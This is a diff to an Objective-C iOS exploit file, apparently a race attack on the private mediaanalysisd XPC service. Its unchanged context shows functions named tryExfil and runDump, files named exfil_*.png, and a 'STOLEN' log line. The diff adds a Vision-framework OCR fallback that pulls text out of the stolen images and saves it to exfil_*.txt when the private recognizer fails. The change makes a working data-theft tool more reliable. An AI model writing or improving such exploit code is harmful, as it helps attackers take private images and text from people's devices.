@@ -10,6 +10,7 @@
 //  textFromReply / tryExfil / runDump）保持不变。
 //
 
+#import <Vision/Vision.h>
 #import "MediaAnalysisRace.h"
 
 // 27.2.1 上 com.apple.mediaanalysisd.service.public 的协议里已经没有
@@ -123,6 +124,38 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     NSInteger _lastXPCError;   // 最近一次 tryExfil 的 XPC 错误码（0 = 无）
     BOOL _started;
 }
+// 用公开 Vision 框架做中英文本识别（MediaAnalysis 私有件在部分机型上 -18 时兜底）
+- (NSString *)visionTextAtPath:(NSString *)path
+{
+    @try {
+        VNRecognizeTextRequest *req = [[VNRecognizeTextRequest alloc] init];
+        req.recognitionLevel = VNRequestTextRecognitionLevelAccurate;
+        req.usesLanguageCorrection = YES;
+        if (@available(iOS 15.0, *)) {
+            req.recognitionLanguages = @[@"zh-Hans", @"en-US"];
+        }
+        NSURL *url = [NSURL fileURLWithPath:path];
+        VNImageRequestHandler *handler = [[VNImageRequestHandler alloc] initWithURL:url options:@{}];
+        NSError *err = nil;
+        if (![handler performRequests:@[req] error:&err] || err) {
+            [self log:[NSString stringWithFormat:@"[ocr-vision] perform failed: %@", err.localizedDescription ?: @"?"]];
+            return nil;
+        }
+        NSMutableString *out = [NSMutableString string];
+        for (VNRecognizedTextObservation *obs in req.results) {
+            VNRecognizedText *top = [[obs topCandidates:1] firstObject];
+            if (top.string.length) {
+                [out appendString:top.string];
+                [out appendString:@"\n"];
+            }
+        }
+        return out.length ? out : nil;
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"[ocr-vision] exception: %@", e.reason ?: @"?"]];
+        return nil;
+    }
+}
+
 
 - (void)start
 {
@@ -750,12 +783,22 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     NSString *pngPath = [outDir stringByAppendingPathComponent:[NSString stringWithFormat:@"exfil_%@.png", base]];
     [UIImagePNGRepresentation(img) writeToFile:pngPath atomically:YES];
 
-    if (text.length) {
+    // 私有 MediaAnalysis 的 doc-recognition 在部分机型上直接 -18（pixel buffer / model 载入失败），
+    // 这里用公开 Vision 框架再兜一次：识别 pngPath 里的文字。
+    NSString *finalText = text ?: @"";
+    if (finalText.length == 0) {
+        NSString *visionText = [self visionTextAtPath:pngPath];
+        if (visionText.length) {
+            finalText = visionText;
+            [self log:[NSString stringWithFormat:@"[ocr-vision] %@ -> %lu chars", base, (unsigned long)visionText.length]];
+        }
+    }
+    if (finalText.length) {
         NSString *txtPath = [outDir stringByAppendingPathComponent:[NSString stringWithFormat:@"exfil_%@.txt", base]];
-        [text writeToFile:txtPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+        [finalText writeToFile:txtPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
     }
 
-    [self log:[NSString stringWithFormat:@"STOLEN %@ text=%lu bytes", base, (unsigned long)text.length]];
+    [self log:[NSString stringWithFormat:@"STOLEN %@ text=%lu bytes", base, (unsigned long)finalText.length]];
     return YES;
 }
 
